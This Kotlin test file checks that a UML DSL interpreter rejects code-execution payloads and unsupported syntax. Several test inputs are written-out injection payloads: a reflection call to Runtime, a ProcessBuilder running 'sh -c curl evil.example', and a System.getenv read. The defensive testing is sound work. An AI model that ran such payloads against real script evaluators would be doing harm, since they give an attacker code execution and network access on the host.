package dev.kuml.core.script.interpreter

import dev.kuml.core.script.EvaluatedScript
import dev.kuml.core.script.FailureKind
import io.kotest.core.spec.style.StringSpec
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain

/**
 * Negative and security tests for the Welle-9 interpreter.
 *
 * ## The security thesis, tested
 *
 * The interpreter never compiles or executes JVM bytecode. Therefore a classic
 * RCE payload (`Runtime::class.java.getMethod(...).invoke(...)`) is **not caught
 * by a denylist as a security feature** — it simply is not a sentence the
 * grammar can express. These tests assert that such payloads fail with an
 * ordinary *parse* error (or, where the denylist happens to fire first, a GUARD
 * failure), never with a `ClassCastException`/NPE or — critically — a success.
 *
 * "Structurally impossible" means: there is no production rule and no allowlist
 * entry that could ever reach `java.lang.Runtime`. That is what these tests pin
 * down.
 */
class InterpreterSecurityAndNegativeTest :
    StringSpec({
        fun eval(src: String): EvaluatedScript = InterpreterScriptEvaluator.evaluate(src, "test.kuml.kts")

        // ── Security: the canonical RCE payloads must fail, never succeed ────────────

        "reflection RCE payload (Runtime::class.java...) fails — no grammar for '::class'" {
            val payload =
                """
                classDiagram(name = "Evil") {
                    val x = Runtime::class.java.getMethod("getRuntime").invoke(null)
                }
                """.trimIndent()
            val result = eval(payload)
            // Must be a failure (never Success). The DSL grammar has no '::' token, so
            // this is a lex/parse rejection (or the guard denylist catches it first).
            (result is EvaluatedScript.Failure) shouldBe true
            val kind = (result as EvaluatedScript.Failure).kind
            (kind == FailureKind.EVALUATION || kind == FailureKind.GUARD) shouldBe true
        }

        "STRUCTURAL PROOF: '::class' is rejected by the parser itself, guard bypassed" {
            // Call the parser directly, so the denylist guard cannot be credited with
            // the rejection. The grammar has no '::' token → this is a pure lex/parse
            // error, proving RCE-via-reflection is structurally impossible on this path,
            // not merely filtered.
            val payload =
                """
                classDiagram(name = "Evil") {
                    val x = Runtime::class.java
                }
                """.trimIndent()
            val ex =
                runCatching { DslParser.parse(payload) }.exceptionOrNull()
            (ex is DslParseException) shouldBe true
        }

        "STRUCTURAL PROOF: a bare arbitrary expression has no production, parser rejects it" {
            // 'foo.bar.baz' as a statement/argument — not a builder call, not a val
            // handle, not an enum member ref. No denylist entry needed; the grammar
            // has no rule that would accept it.
            val payload =
                """
                classDiagram(name = "X") {
                    someObject.someField.someMethod
                }
                """.trimIndent()
            val ex = runCatching { DslParser.parse(payload) }.exceptionOrNull()
            (ex is DslParseException) shouldBe true
        }

        "ProcessBuilder construction fails — no production for arbitrary constructors" {
            val payload =
                """
                classDiagram(name = "Evil") {
                    val p = ProcessBuilder("sh", "-c", "curl evil.example")
                }
                """.trimIndent()
            val result = eval(payload)
            (result is EvaluatedScript.Failure) shouldBe true
        }

        "arbitrary method chain (System.getenv) fails — dotted chains are rejected" {
            val payload =
                """
                classDiagram(name = "Evil") {
                    val e = System.getenv("HOME")
                }
                """.trimIndent()
            val result = eval(payload)
            (result is EvaluatedScript.Failure) shouldBe true
        }

        // ── Negative: unsupported-but-syntactically-plausible constructs ─────────────

        "a for-loop is not part of the grammar → clear parse error, not a crash" {
            val payload =
                """
                classDiagram(name = "Loops") {
                    for (i in 1..10) {
                        classOf(name = "C")
                    }
                }
                """.trimIndent()
            val result = eval(payload)
            result.shouldBeFailureWith(FailureKind.EVALUATION)
        }

        "an unsupported diagram type (sysml2Model) yields a specific 'use compiler' message" {
            val payload =
                """
                sysml2Model(name = "V") {
                }
                """.trimIndent()
            val result = eval(payload)
            result.shouldBeFailureWith(FailureKind.EVALUATION)
            (result as EvaluatedScript.Failure).message shouldContain "eval-strategy=compiler"
        }

        "an unsupported diagram type is named specifically, not a generic 'unknown builder'" {
            val result = eval("c4Model(name = \"X\") { }")
            result.shouldBeFailureWith(FailureKind.EVALUATION)
            (result as EvaluatedScript.Failure).message shouldContain "c4Model"
        }

        "an unknown builder inside a class body is rejected with an actionable message" {
            val payload =
                """
                classDiagram(name = "X") {
                    classOf(name = "C") {
                        bogusBuilder(name = "nope")
                    }
                }
                """.trimIndent()
            val result = eval(payload)
            result.shouldBeFailureWith(FailureKind.EVALUATION)
            (result as EvaluatedScript.Failure).message shouldContain "bogusBuilder"
        }

        "string interpolation is explicitly unsupported with a clear message" {
            val payload =
                """
                classDiagram(name = "X") {
                    val n = "Order"
                    classOf(name = "${'$'}n") { }
                }
                """.trimIndent()
            val result = eval(payload)
            result.shouldBeFailureWith(FailureKind.EVALUATION)
            (result as EvaluatedScript.Failure).message shouldContain "interpolation"
        }

        "referencing an undeclared val fails clearly" {
            val payload =
                """
                classDiagram(name = "X") {
                    association(source = ghost, target = ghost) { }
                }
                """.trimIndent()
            val result = eval(payload)
            result.shouldBeFailureWith(FailureKind.EVALUATION)
            (result as EvaluatedScript.Failure).message shouldContain "ghost"
        }

        "a well-formed minimal class diagram still succeeds (interpreter is not over-broad)" {
            val result = eval("classDiagram(name = \"Ok\") { classOf(name = \"A\") { } }")
            (result is EvaluatedScript.Success) shouldBe true
        }
    })

private fun EvaluatedScript.shouldBeFailureWith(kind: FailureKind) {
    (this is EvaluatedScript.Failure) shouldBe true
    (this as EvaluatedScript.Failure).kind shouldBe kind
}
